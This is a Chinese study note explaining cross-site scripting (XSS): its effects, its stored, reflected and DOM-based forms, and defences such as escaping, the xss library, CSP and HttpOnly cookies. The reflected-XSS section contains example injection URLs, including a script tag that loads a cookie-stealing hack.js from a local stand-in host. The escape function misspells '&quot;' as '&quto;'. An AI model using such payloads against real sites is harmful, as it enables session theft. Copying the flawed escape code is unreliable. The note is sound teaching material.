---
tags:
title: XSS
date created: 2023-04-04
date modified: 2023-04-26
---

# XSS

XSS 全称是 Cross Site Scripting，为了与“CSS”区分开来，故简称 XSS，翻译过来就是“跨站脚本”。XSS 攻击是指黑客往 HTML 文件中或者 DOM 中注入恶意脚本，从而在用户浏览页面时利用注入的恶意脚本对用户实施攻击的一种手段。  
如果页面被注入了恶意 JavaScript 脚本，恶意脚本都能做哪些事情。

- **可以窃取 Cookie 信息**。恶意 JavaScript 可以通过“document.cookie”获取 Cookie 信息，然后通过 XMLHttpRequest 或者 Fetch 加上 CORS 功能将数据发送给恶意服务器；恶意服务器拿到用户的 Cookie 信息之后，就可以在其他电脑上模拟用户的登录，然后进行转账等操作。
- **可以监听用户行为**。恶意 JavaScript 可以使用“addEventListener”接口来监听键盘事件，比如可以获取用户输入的信用卡等信息，将其发送到恶意服务器。黑客掌握了这些信息之后，又可以做很多违法的事情。
- 可以通过修改 DOM 伪造假的登录窗口，用来**欺骗用户输入用户名和密码等信息**。
- 还可以在页面内**生成浮窗广告**，这些广告会严重地影响用户体验。

### 恶意脚本是怎么注入的

#### **存储型 XSS 攻击**

黑客利用站点漏洞将一段恶意 JavaScript 代码提交到网站的数据库中；

#### **反射型 XSS 攻击**

在一个反射型 XSS 攻击过程中，恶意 JavaScript 脚本属于用户发送给网站请求中的一部分，随后网站又把恶意 JavaScript 脚本返回给用户

```JavaScript
// 普通
http://localhost:3000/?from=china
// alert尝试
http://localhost:3000/?from=<script>alert(3)</script>
// 获取Cookie
http://localhost:3000/?from=<script src="http://localhost:4000/hack.js"> </script>
// 短域名伪造 https://dwz.cn/
```

#### **基于 DOM 的 XSS 攻击**

具体来讲，黑客通过各种手段将恶意脚本注入用户的页面中，比如通过网络劫持在页面传输过程中修改 HTML 页面的内容，这种劫持类型很多，有通过 WiFi 路由器劫持的，有通过本地恶意软件来劫持的，它们的共同点是在 Web 资源传输过程或者在用户使用页面的过程中修改 Web 页面的数据。

### 如何阻止 XSS 攻击

1. **服务器对输入脚本进行过滤或转码**

   - 黑名单

   ```JavaScript
   function escape(str) {
     str = str.replace(/&/g, "&amp;");
     str = str.replace(/</g, "&lt;");
     str = str.replace(/>/g, "&gt;");
     str = str.replace(/"/g, "&quto;");
     str = str.replace(/'/g, "&#39;");
     str = str.replace(/`/g, "&#96;");
     str = str.replace(/\//g, "&#x2F;");
     return str;
   }
   ```

   - 白名单

   ```JavaScript
   const xss = require("xss");
   let html = xss('<h1 id="title">XSS Demo</h1><script>alert("xss");</script>');
   // -> <h1>XSS Demo</h1>&lt;script&gt;alert("xss");&lt;/script&gt;
   ```

2) **充分利用 CSP**  
   CSP 有如下几个功能：

- 限制加载其他域下的资源文件，这样即使黑客插入了一个 JavaScript 文件，这个 JavaScript 文件也是无法被加载的；
- 禁止向第三方域提交数据，这样用户数据也不会外泄；
- 禁止执行内联脚本和未授权的脚本；
- 还提供了上报机制，这样可以帮助我们尽快发现有哪些 XSS 攻击，以便尽快修复问题。

```JavaScript
// 只允许加载本站资源
Content-Security-Policy: default-src 'self'
// 只允许加载 HTTPS 协议图片
Content-Security-Policy: img-src https://*
// 不允许加载任何来源框架
Content-Security-Policy: child-src 'none'
```

3. **使用 HttpOnly 属性**

由于很多 XSS 攻击都是来盗用 Cookie 的，因此还可以通过使用 HttpOnly 属性来保护我们 Cookie 的安全。

```node
response.addHeader("Set-Cookie", "uid=112; Path=/; HttpOnly");
```
